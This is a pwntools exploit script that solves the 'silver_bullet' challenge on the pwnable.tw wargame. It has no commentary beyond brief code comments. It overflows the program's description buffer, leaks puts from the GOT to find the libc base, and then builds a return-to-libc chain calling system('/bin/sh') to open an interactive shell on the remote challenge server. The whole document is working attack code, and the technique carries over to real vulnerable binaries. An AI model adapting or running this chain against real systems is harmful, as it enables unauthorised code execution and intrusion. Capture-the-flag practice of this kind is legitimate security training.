import pwn

# initialize environment
pwn.context.update(arch='i386', os='linux')
def create_proc():
    is_local = 0
    if is_local:
        p = pwn.process("./silver_bullet_patched")
    else:
        p = pwn.remote("chall.pwnable.tw", 10103)
    return p
libc = pwn.ELF("./libc_32.so.6")
elf = pwn.ELF("./silver_bullet_patched")

PUTS_GOT_OFFSET = elf.got["puts"]
PUTS_LIBC_OFFSET = libc.symbols["puts"]
SYSTEM_LIBC_OFFSET = libc.symbols["system"]
BINSH_OFFSET = next(libc.search("/bin/sh"))
print("PUTS_GOT_OFFSET: ", hex(PUTS_GOT_OFFSET))
print("PUTS_LIBC_OFFSET: ", hex(PUTS_LIBC_OFFSET))
print("SYSTEM_LIBC_OFFSET: ", hex(SYSTEM_LIBC_OFFSET))
print("BINSH_OFFSET: ", hex(BINSH_OFFSET))



#leak address
p = create_proc()
p.sendlineafter(b"Your choice :", b"1")
p.sendlineafter(b"Give me your description of bullet :", b"A"*0x2f)
p.sendlineafter(b"Your choice :", b"2")
p.sendlineafter(b"Give me your another description of bullet :", b"B")
p.sendlineafter(b"Your choice :", b"2")
payload = b"\x88"*4 + b"C"*3 # increate bullet->HP greater than werewolf->HP (0x7fffffff) and padding
payload += pwn.p32(0x080484a8) # puts
payload += pwn.p32(elf.symbols["main"]) # main
payload += pwn.p32(PUTS_GOT_OFFSET) # puts in got table
payload += b"C"*0x1c # overwrite stack
p.sendlineafter(b"Give me your another description of bullet :", payload)
#pwn.gdb.attach(p)
#p.interactive()
p.sendlineafter(b"Your choice :", b"3")
p.recvuntil(b"Oh ! You win !!")

#calculate address
p.recvline()
ELF_PUTS_GOT_ADDR = pwn.u32(p.recv(4))
LIBC_BASE = ELF_PUTS_GOT_ADDR - PUTS_LIBC_OFFSET
SYSTEM_ADDR = LIBC_BASE + SYSTEM_LIBC_OFFSET
BINSH_ADDR = LIBC_BASE + BINSH_OFFSET
print("Leak puts address in GOT: ", hex(ELF_PUTS_GOT_ADDR))
print("libc base: ", hex(LIBC_BASE))
print("system address: ", hex(SYSTEM_ADDR))

#call system
p.sendlineafter(b"Your choice :", b"1")
p.sendlineafter(b"Give me your description of bullet :", b"A"*0x2f)
p.sendlineafter(b"Your choice :", b"2")
p.sendlineafter(b"Give me your another description of bullet :", b"B")
p.sendlineafter(b"Your choice :", b"2")
payload = b"\x88"*4 + b"C"*3 # increate bullet->HP greater than werewolf->HP (0x7fffffff) and padding
payload += pwn.p32(SYSTEM_ADDR) # system
payload += pwn.p32(LIBC_BASE + libc.symbols["exit"]) # exit
payload += pwn.p32(BINSH_ADDR) # /bin/sh
payload += b"C"*0x1c # overwrite stack
p.sendlineafter(b"Give me your another description of bullet :", payload)
p.sendlineafter(b"Your choice :", b"3")
p.interactive()
